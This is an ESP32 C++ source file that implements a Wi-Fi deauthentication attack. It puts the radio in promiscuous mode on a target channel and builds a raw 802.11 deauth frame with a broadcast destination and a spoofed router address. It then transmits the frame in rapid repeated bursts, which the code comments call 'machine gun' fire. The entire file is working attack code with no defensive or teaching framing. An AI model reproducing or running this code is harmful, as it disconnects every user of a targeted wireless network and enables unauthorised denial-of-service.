#include "Attack_Deauth.h"
#include "esp_wifi.h"
#include <WiFi.h>

uint8_t _targetBSSID[6];
int _targetChannel;

void StartDeauth(uint8_t* targetBSSID, int channel) {
    memcpy(_targetBSSID, targetBSSID, 6);
    _targetChannel = channel;
    
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(_targetChannel, WIFI_SECOND_CHAN_NONE);
}

void RunDeauthLoop() {
    // Deauth Frame ()
    uint8_t packet[26] = {
        0xC0, 0x00, 0x3A, 0x01, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest: Broadcast
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Src: Router
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: Router
        0x00, 0x00, 0x07, 0x00 
    };
    
    memcpy(&packet[10], _targetBSSID, 6);
    memcpy(&packet[16], _targetBSSID, 6);
    
    // Rapid fire like a machine gun :)
    for(int i=0; i<5; i++) { 
        esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, false); 
        delay(2); 
    }
    delay(10);
}

void StopDeauth() {
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_STA);
}